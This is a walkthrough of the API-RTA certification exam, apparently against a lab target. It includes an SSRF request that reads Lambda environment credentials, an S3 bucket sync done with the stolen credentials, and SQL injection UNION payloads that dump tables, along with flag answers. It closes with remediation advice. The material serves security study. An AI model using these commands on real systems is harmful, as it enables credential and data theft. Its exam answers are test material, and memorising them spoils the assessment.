# API-RTA Exam Writeup — CyberWarFare Labs

## Overview
* **Certification:** API Red Team Analyst (API-RTA)
* **Provider:** CyberWarFare Labs
* **Scope:** Practical API & Cloud Security Assessment

---

## Theoretical Questions Summary
The exam includes several conceptual questions testing fundamental API security knowledge. Below are the key findings mapped to standard vulnerability definitions:
* **Q2 (BOLA):** Broken Object Level Authorization occurs when an API endpoint does not properly validate whether the authenticated user has permission to access or modify a specific object resource ID.
* **Q4 (SSRF):** Server-Side Request Forgery happens when a web application fetches a remote resource without validating the user-supplied URL, allowing attackers to coerce the server into sending requests to internal systems or local files (`file://`).
* **Q5 (IDOR):** Insecure Direct Object References occur when an application uses client-provided input to access objects directly without sufficient access control checks.
* **Q6 (BFLA):** Broken Function Level Authorization refers to weak access control policies that fail to properly restrict administrative or sensitive functions from non-privileged users.
* **Q10 (AWS Lambda):** Serverless compute service used to execute backend logic in response to API requests.

---

## Methodology & Flag Walkthrough

### 1. Cloud Exploitation: SSRF via AWS Lambda & S3 Exfiltration

#### Endpoint Discovery
During manual traffic inspection using a proxy (such as Burp Suite) while exploring features like "Check Outage" or order status validation, requests were observed interacting with an external AWS Lambda function URL:
```text
https://<lambda-id>.lambda-url.ap-south-1.on.aws/validate
```
This identified **AWS Lambda** as the underlying cloud hosting service (**Q10**).

#### SSRF & Local File Read (`/proc/self/environ`)
The endpoint exposed a parameter vulnerable to Server-Side Request Forgery (SSRF) that permitted reading local files via the `file://` URI scheme. To inspect the runtime environment variables of the Lambda execution process, the following request was crafted:
```bash
curl "https://<lambda-id>.lambda-url.ap-south-1.on.aws/validate" \
  -sX POST \
  -H "Content-Type: application/json" \
  -d '{"url":"file:///proc/self/environ"}' \
  -o lambda_environment.txt
```

**Why `/proc/self/environ`?**
In Linux environments, `/proc/` is a pseudo-filesystem containing process runtime info. `self` points to the current active process, and `environ` exposes its environment variables. In serverless Python runtimes like AWS Lambda, environment variables frequently store sensitive runtime tokens, configuration parameters, and IAM credentials.

#### Extracting Core Flags & Credentials
Parsing the `lambda_environment.txt` dump immediately revealed:
* **Q3 (AWS Account ID):** `AWS_ACCOUNT_ID=367185498861`
* **Q11 (S3 Bucket Name):** `BUCKET_NAME=api-rta-exam-bucket-2df3f88b8f9b`
* Temporary AWS STS credentials (`AWS_ACCESS_KEY_ID` starting with `ASIA`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`).

#### Q1 — Recovering Sherlock Holmes' Credit Card
1. **AWS CLI Configuration:** Because the exposed credentials were temporary STS tokens, configuring them required including the session token inside `~/.aws/credentials`:
   ```ini
   [default]
   aws_access_key_id = ASIA...
   aws_secret_access_key = ...
   aws_session_token = ...
   ```
2. **S3 Bucket Synchronization:** Using the authenticated CLI profile, the private S3 bucket was synced locally:
   ```bash
   aws s3 sync s3://api-rta-exam-bucket-2df3f88b8f9b/ ./bucket_contents/
   ```
3. **Result:** Reviewing the downloaded JSON files inside `./bucket_contents/payments/` exposed `credit_card.json`, containing the credit card number of Sherlock Holmes (**Q1**).

---

### 2. Authentication & JWT Security

#### Flag Q7 & Q8 — JWT Key Recovery & Endpoint Discovery
During API enumeration, inspecting public endpoints revealed an exposed JSON Web Key Set (JWKS) file:
```http
GET /.well-known/jwks.json HTTP/1.1
Host: <TARGET_IP>
```
* **Q7 (Exposed Endpoint):** `/.well-known/jwks.json`
* **Q8 (Signing Key Value):** The HMAC symmetric secret key was retrieved from the cryptographic parameters exposed at this endpoint.

---

### 3. Database Vulnerabilities (SQL Injection)

#### 1. Identifying the SQL Injection Vulnerability
Input parameter testing on the product search endpoint revealed an unauthenticated SQL injection vulnerability:
```http
GET /api/v1/products/search?name=x' HTTP/1.1
Host: <TARGET_IP>
Cookie: vulncart_token=<JWT_TOKEN>
```
Injecting a single quote (`'`) triggered a database error, confirming that user input was directly concatenated into the backend SQL query without parameterization.

#### 2. Fingerprinting the DBMS & Schema Discovery (`sqlite_master`)
SQLite stores metadata regarding the database structure in a system table named `sqlite_master`. A `UNION`-based payload was constructed to test for SQLite compatibility and map the schema:
```text
/api/v1/products/search?name=x'+UNION+SELECT+name,+sql,+3+FROM+sqlite_master+WHERE+type='table'--
```
Executing this query successfully enumerated 7 backend tables:
* `cart`
* `giftcards`
* `giftcard_redemptions`
* `orders`
* `products`
* `users`
* `sqlite_sequence`

#### 3. Flag Exfiltration Walkthrough

##### Flag Q9 — Price of the Hidden Product
Reviewing the structure of the `products` table via `sqlite_master` revealed the column structure `(id, name, price, ...)`. Executing a `UNION SELECT` query dumped all catalog items:
```text
/api/v1/products/search?name=x'+UNION+SELECT+id,+name,+price+FROM+products--
```
* **Observation:** Standard storefront items (`T-Shirt`, `Shoes`) corresponded to IDs `1` and `2`.
* **Discovery:** A hidden product named `"Hack Me Not"` with ID `1337` (visibility flag set to `0`) was exposed, revealing the base catalog price required for **Q9**.

##### Flag Q12 — Gift Card Code Value
Querying mismatched column counts on the `giftcards` table initially returned an `HTTP 500 Internal Server Error` due to strict SQL column alignment rules in `UNION` queries. Referring back to the schema extracted from `sqlite_master`, the `giftcards` table structure was identified: `(code, value, redeemed)`. The column structure was matched using:
```text
/api/v1/products/search?name=x'+UNION+SELECT+code,+value,+redeemed+FROM+giftcards--
```
This successfully dumped the valid gift card string (`GIFT-<REDACTED>`), fulfilling requirement **Q12**.

---

## Key Lessons Learned & Defensive Remediation
1. **Never expose symmetric HMAC keys** via public JWKS endpoints or client-side assets.
2. **Enforce server-side authorization checks** to validate that the authenticated session owns the requested object before returning data.
3. **Use parameterized queries / ORMs** to eliminate SQL Injection vectors in API search filters.
4. **Restrict file URI schemes in SSRF mitigations** and apply the Principle of Least Privilege to serverless IAM roles.
